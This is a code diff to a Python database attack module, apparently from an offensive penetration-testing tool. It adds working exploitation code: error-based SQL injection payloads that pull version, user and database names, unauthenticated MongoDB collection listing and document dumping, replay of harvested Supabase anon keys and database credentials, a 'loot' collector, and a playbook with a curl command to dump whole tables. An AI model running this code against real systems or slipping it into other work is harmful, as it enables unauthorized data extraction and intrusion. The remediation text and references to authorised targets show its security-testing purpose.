-        "1 AND 1=convert(int,@@version)--",
-        "' AND 1=convert(int,@@version)-- -"]),
-    (re.compile(r"invalid input syntax for (?:type )?integer: \"([^\"]+)", re.I), [
-        "1 AND 1=cast(version() as int)--",
-        "' AND 1=cast(version() as int)-- -"]),
+def _mongo_cmd(host: str, port: int, elements: bytes, read: int = 16384) -> bytes:
+    return _tcp_send_recv(host, port, _op_msg(_bson_doc(elements)), read=read)
+
+
+def _exploit_mongodb(host: str, port: int, dbs: list[str], loot: Path | None) -> list[Finding]:
+    """List collections of a real database and pull sample documents (proof of data access)."""
+    if not dbs:
+        return []
+    db = next((d for d in dbs if d not in ("admin", "local", "config")), dbs[0])
+    resp = _mongo_cmd(host, port, _bson_int32("listCollections", 1) + _bson_str("$db", db))
+    colls = [m.decode("latin-1", "replace")
+             for m in re.findall(rb"\x02name\x00.{4}([ -~]{1,64}?)\x00", resp)]
+    colls = [c for c in colls if c and c != "name"][:10]
+    sample = ""
+    if colls:
+        fr = _mongo_cmd(host, port,
+                        _bson_str("find", colls[0]) + _bson_int32("limit", 5) + _bson_str("$db", db))
+        sample = re.sub(rb"[^\x20-\x7e\n]", b".", fr).decode("latin-1", "replace")[:4000]
+    dump = (f"database: {db}\ncollections: {', '.join(colls)}\n\n"
+            f"sample documents from {colls[0] if colls else '(none)'}:\n{sample}")
+    evidence_file = _save_evidence(loot, f"mongo_{host}_{port}.txt", dump)
+    return [_f(f"MongoDB Data Extracted: {host}:{port}",
+               f"Listed collections of '{db}' and pulled sample documents without auth — "
+               f"{len(colls)} collection(s): {', '.join(colls[:6]) or '(none readable)'}.",
+               Severity.CRITICAL, "Require authentication and firewall the port.",
+               "extraction", host=host, port=port, engine="MongoDB", database=db,
+               collections=colls, evidence_file=evidence_file,
+               evidence=[f"listCollections on '{db}' → {len(colls)} collection(s)",
+                         f"sampled documents from '{colls[0]}'" if colls else "no readable collection"])]
+
+
+# In-band SQLi data extraction: pull version / current_user / database via three error-based vectors.
+_SQLI_EXFIL: dict[str, tuple[str, str, str]] = {
+    # label: (MySQL extractvalue expr, MSSQL convert expr, PostgreSQL cast expr)
+    "version":  ("version()", "@@version", "version()"),
+    "user":     ("current_user()", "current_user", "current_user"),
+    "database": ("database()", "db_name()", "current_database()"),
+}
+_SQLI_VECTORS: list[tuple[re.Pattern[str], str]] = [
+    (re.compile(r"~([^~]+)~"), "1 AND extractvalue(1,concat(0x7e,({expr}),0x7e))-- -"),
+    (re.compile(r"converting the \w+ value '([^']+)", re.I), "1 AND 1=convert(int,({expr}))-- -"),
+    (re.compile(r"invalid input syntax for (?:type )?integer: \"([^\"]+)", re.I),
+     "1 AND 1=cast(({expr}) as int)-- -"),
 ]
 
 
 def _sqli_extract(inj) -> str:
-    """Best-effort in-band extraction of the DB version via error-based payloads."""
-    for rx, payloads in _SQLI_EXTRACT:
-        for p in payloads:
-            resp = inj.inject(p)
+    """Best-effort in-band extraction of version + current user + database via error-based payloads."""
+    out: dict[str, str] = {}
+    for label, exprs in _SQLI_EXFIL.items():
+        for (rx, tmpl), expr in zip(_SQLI_VECTORS, exprs):
+            resp = inj.inject(tmpl.format(expr=expr))
             if resp is None:
                 continue
             m = rx.search(resp.text)
             if m:
-                return m.group(1).strip()[:200]
-    return ""
+                out[label] = m.group(1).strip()[:120]
+                break
+    return "; ".join(f"{k}={v}" for k, v in out.items())
 
 
 def _exploit_sqli(engine: ScanEngine, loot: Path | None) -> list[Finding]:
@@ -1099,8 +1479,48 @@ def _exploit_cred_reuse(engine: ScanEngine) -> list[Finding]:
                 Severity.CRITICAL,
                 "Rotate the exposed credentials and remove them from client-side code.",
                 "cred_reuse", host=host, port=port, engine=scheme,
-                reused_credential=f"{user}:***", confidence="high"))
+                reused_credential=f"{user}:***", confidence="high",
+                evidence=[f"connected to {scheme}://{host} with harvested credentials {user}:***"],
+                exploitation=_db_exploitation("creds_leak", host=host, port=port,
+                                              desc="Connect directly to the live database with the reused credentials.",
+                                              cmd=f"{scheme} client → {user}@{host}")))
     return findings
+
+
+_SUPABASE_TABLES = ("users", "profiles", "todos", "posts", "messages", "customers", "accounts", "orders")
+
+
+def _exploit_supabase(engine: ScanEngine, loot: Path | None) -> list[Finding]:
+    """Replay the harvested Supabase anon key against the REST API — readable rows prove RLS is OFF."""
+    try:
+        blob = "\n".join(engine.get_crawl().pages.values())
+    except Exception:  # noqa: BLE001
+        return []
+    projects = set(_SUPABASE_RE.findall(blob))
+    keym = _SUPABASE_KEY_RE.search(blob)
+    if not projects or not keym:
+        return []
+    proj, key = list(projects)[0], keym.group(1)
+    for table in _SUPABASE_TABLES:
+        url = f"https://{proj}.supabase.co/rest/v1/{table}?select=*&limit=3"
+        try:
+            r = engine.request("GET", url, timeout=8.0,
+                               headers={"apikey": key, "authorization": f"Bearer {key}"})
+        except httpx.HTTPError:
+            continue
+        if r.status_code == 200 and r.text.strip().startswith("[") and r.text.strip() not in ("[]", ""):
+            evidence_file = _save_evidence(loot, f"supabase_{proj}_{table}.json", r.text[:8000])
+            return [_f(
+                f"Supabase RLS Disabled — Table '{table}' World-Readable: {proj}",
+                f"The public anon key read rows from '{table}' on {proj}.supabase.co — Row-Level Security "
+                "is OFF, so the embedded anon key exposes (and likely lets anyone write) the data.",
+                Severity.CRITICAL,
+                "Enable restrictive Row-Level Security on every Supabase table immediately.",
+                "cloud_db", project=proj, table=table, url=url, proof_url=url, evidence_file=evidence_file,
+                evidence=ev.from_response(r, indicator=f"anon key returned rows from '{table}' — RLS off"),
+                exploitation=_db_exploitation("cloud_db", desc="Dump the whole table with the anon key.",
+                                              cmd=f"curl '{url.replace('limit=3', 'limit=10000')}' -H 'apikey: <anon_key>'"))]
+    return []
 
 
 # ---------------------------------------------------------------------------
@@ -1127,6 +1547,69 @@ def _check_tls(host: str, port: int) -> list[Finding]:
                    Severity.MEDIUM, "Enable and require TLS for database connections.",
                    "tls", host=host, port=port)]
     return []
+
+
+# ---------------------------------------------------------------------------
+# Version → CVE correlation (high-signal DB RCE / auth-bypass CVEs)
+# ---------------------------------------------------------------------------
+
+# Each entry fires when a fingerprinted banner version of *engine* falls in [min, max).
+_DB_CVES: list[dict] = [
+    {"engine": "Redis", "max": (7, 0, 0), "cve": "CVE-2022-0543",
+     "impact": "Lua sandbox escape → remote code execution (Debian/Ubuntu packaging)"},
+    {"engine": "Elasticsearch", "max": (1, 4, 3), "cve": "CVE-2015-1427",
+     "impact": "Groovy scripting sandbox bypass → remote code execution"},
+    {"engine": "CouchDB", "max": (2, 1, 1), "cve": "CVE-2017-12636",
+     "impact": "admin privilege escalation → remote code execution"},
+    {"engine": "PostgreSQL", "min": (9, 3, 0), "max": (11, 99, 0), "cve": "CVE-2019-9193",
+     "impact": "COPY TO/FROM PROGRAM → OS command execution (superuser)"},
+    {"engine": "MySQL", "max": (5, 6, 0), "cve": "CVE-2012-2122",
+     "impact": "authentication bypass via repeated login on affected builds"},
+    {"engine": "Cassandra", "min": (3, 0, 0), "max": (4, 1, 0), "cve": "CVE-2021-44521",
+     "impact": "RCE via scripted user-defined functions when enabled"},
+    {"engine": "MongoDB", "max": (2, 4, 0), "cve": "CVE-2013-1892",
+     "impact": "native-code execution via unauthenticated nativeHelper.apply"},
+]
+
+
+def _ver_tuple(s: str) -> "tuple[int, int, int] | None":
+    parts = [int(p) for p in re.findall(r"\d+", s)[:3]]
+    if not parts:
+        return None
+    while len(parts) < 3:
+        parts.append(0)
+    return (parts[0], parts[1], parts[2])
+
+
+def _check_versions(ip: str, open_ports: list["_OpenPort"]) -> list[Finding]:
+    """Correlate a fingerprinted DB version against known high-impact CVEs (RCE / auth bypass)."""
+    findings: list[Finding] = []
+    for op in open_ports:
+        vt = _ver_tuple(op.version) if op.version else None
+        if not vt:
+            continue
+        for cve in _DB_CVES:
+            if cve["engine"] not in op.engine:
+                continue
+            if "max" in cve and vt >= cve["max"]:
+                continue
+            if "min" in cve and vt < cve["min"]:
+                continue
+            findings.append(_f(
+                f"Known Vulnerability — {op.engine} {op.version}: {cve['cve']}",
+                f"{op.engine} {op.version} on {ip}:{op.port} falls in the affected range for "
+                f"{cve['cve']}: {cve['impact']}. Verify the exact build, then exploit on an authorised target.",
+                Severity.HIGH,
+                f"Upgrade {op.engine} to a patched release and restrict network access.",
+                "cve", host=ip, port=op.port, engine=op.engine, version=op.version,
+                cve_id=cve["cve"], cve_impact=cve["impact"], proof_url="",
+                evidence=[f"banner version: {op.engine} {op.version}",
+                          f"within the affected range for {cve['cve']}"],
+                exploitation=_db_exploitation("admin", host=ip, port=op.port,
+                                              desc=f"Find and run a public exploit for {cve['cve']}.",
+                                              cmd=f"searchsploit {cve['cve']}   # exploit-db / Metasploit for {op.engine} {op.version}"),
+                exploit_cmd=f"searchsploit {cve['cve']}"))
+    return findings
 
 
 # ---------------------------------------------------------------------------
@@ -1202,11 +1685,26 @@ def run(engine: ScanEngine) -> list[Finding]:
             guard(_check_couchdb, engine, ip, op.port)
         elif op.engine == "MongoDB":
             guard(_check_mongodb, ip, op.port)
+        elif op.engine == "ClickHouse":
+            guard(_check_clickhouse, engine, ip, op.port)
+        elif op.engine == "etcd":
+            guard(_check_etcd, engine, ip, op.port)
+        elif op.engine == "InfluxDB":
+            guard(_check_influxdb, engine, ip, op.port)
+        elif op.engine == "Neo4j":
+            guard(_check_neo4j, engine, ip, op.port)
+        elif op.engine == "Zookeeper":
+            guard(_check_zookeeper, ip, op.port)
+        elif op.engine == "Cassandra":
+            guard(_check_cassandra, ip, op.port)
         # Default credentials (skipped in safe mode)
-        if not safe and op.engine in ("MySQL/MariaDB", "PostgreSQL"):
+        if not safe and op.engine in ("MySQL/MariaDB", "PostgreSQL", "MSSQL"):
             guard(_check_default_creds, ip, op.port, op.engine)
         # TLS
         guard(_check_tls, ip, op.port)
+
+    # Known-CVE correlation from fingerprinted DB versions (RCE / auth bypass).
+    guard(_check_versions, ip, open_ports)
 
     # Injection surface (HTTP) — params, forms, and now headers/cookies
     guard(_check_sqli, engine, safe)
@@ -1238,8 +1736,8 @@ def run(engine: ScanEngine) -> list[Finding]:
             if f.raw.get("db_category") != "unauth":
                 continue
             host, port, eng = f.raw.get("host"), f.raw.get("port"), f.raw.get("engine")
-            if eng == "Redis" and f.raw.get("sample_keys") and host and port:
-                guard(_exploit_redis, host, port, f.raw["sample_keys"], loot)
+            if eng == "Redis" and host and port:
+                guard(_exploit_redis, host, port, f.raw.get("sample_keys", []), loot)
             elif eng == "Elasticsearch" and host and port:
                 _extend_first_scheme(findings, engine, "Elasticsearch", host, port,
                                      "/_search?size=10", loot)
@@ -1247,8 +1745,19 @@ def run(engine: ScanEngine) -> list[Finding]:
                 db0 = f.raw["databases"][0]
                 _extend_first_scheme(findings, engine, "CouchDB", host, port,
                                      f"/{db0}/_all_docs?include_docs=true&limit=10", loot)
-        guard(_exploit_sqli, engine, loot)        # in-band SQLi version extraction
+            elif eng == "MongoDB" and host and port:
+                guard(_exploit_mongodb, host, port, f.raw.get("mongo_dbs", f.raw.get("databases", [])), loot)
+            elif eng == "ClickHouse" and host and port:
+                _extend_first_scheme(findings, engine, "ClickHouse", host, port,
+                                     "/?query=SELECT%20*%20FROM%20system.tables%20LIMIT%2050%20FORMAT%20JSON", loot)
+            elif eng == "etcd" and host and port:
+                _extend_first_scheme(findings, engine, "etcd", host, port, "/v2/keys/?recursive=true", loot)
+            elif eng == "InfluxDB" and host and port:
+                _extend_first_scheme(findings, engine, "InfluxDB", host, port,
+                                     "/query?q=SHOW+MEASUREMENTS", loot)
+        guard(_exploit_sqli, engine, loot)        # in-band SQLi version/user/db extraction
         guard(_exploit_cred_reuse, engine)        # replay harvested creds against DB hosts
+        guard(_exploit_supabase, engine, loot)    # live Supabase RLS test with the anon key
 
     # Exposure score
     score, grade = _exposure_score(findings)
@@ -1276,12 +1785,14 @@ def build_playbook(findings: list[Finding]) -> list[dict]:
     db = [f for f in findings if f.module == MODULE]
     plan: list[dict] = []
     for f in sorted(db, key=lambda x: severity_rank(x.severity.value)):
-        cmd = f.raw.get("sqlmap") or f.raw.get("exploit_cmd")
-        if not cmd:
+        steps = f.raw.get("exploitation") if isinstance(f.raw.get("exploitation"), list) else []
+        cmd = f.raw.get("sqlmap") or f.raw.get("exploit_cmd") or (steps[0]["command"] if steps else "")
+        if not cmd and not steps:
             continue
         plan.append({"severity": f.severity.value, "title": f.title,
                      "category": f.raw.get("db_category", ""), "command": cmd,
-                     "attack": f.raw.get("attack", ""), "evidence": f.raw.get("evidence_file", "")})
+                     "attack": f.raw.get("attack", ""), "evidence": f.raw.get("evidence_file", ""),
+                     "steps": steps})
     return plan
 
 
@@ -1298,7 +1809,12 @@ def collect_loot(findings: list[Finding]) -> list[str]:
             loot.append(f"Elasticsearch indices (~{r.get('doc_count', 0)} docs): "
                         + ", ".join(r["indices"][:6]))
         if r.get("databases"):
-            loot.append("CouchDB databases: " + ", ".join(r["databases"][:6]))
+            loot.append(f"{r.get('engine', 'DB')} databases: " + ", ".join(str(x) for x in r["databases"][:6]))
+        if r.get("collections"):
+            loot.append(f"MongoDB collections ({r.get('database', '?')}): "
+                        + ", ".join(str(x) for x in r["collections"][:6]))
+        if r.get("table"):
+            loot.append(f"Supabase table readable (RLS off): {r['table']}")
         if r.get("types"):
             loot.append("GraphQL types: " + ", ".join(r["types"][:6]))
         if r.get("snippet"):
@@ -1405,7 +1921,13 @@ def render_panel(findings: list[Finding]) -> None:
             if step.get("attack"):
                 plan_block.append(f"  ⟦{step['attack']}⟧", style="magenta")
             plan_block.append("\n")
-            plan_block.append(f"      $ {step['command']}\n", style="bold cyan")
+            sub = step.get("steps") or []
+            if len(sub) > 1:
+                for s in sub:
+                    plan_block.append(f"      {s.get('step')}. {s.get('description')}\n", style="dim white")
+                    plan_block.append(f"         $ {s.get('command')}\n", style="cyan")
+            else:
+                plan_block.append(f"      $ {step['command']}\n", style="bold cyan")
             if step.get("evidence"):
                 plan_block.append(f"      ⧉ evidence: {step['evidence']}\n", style="green")
 
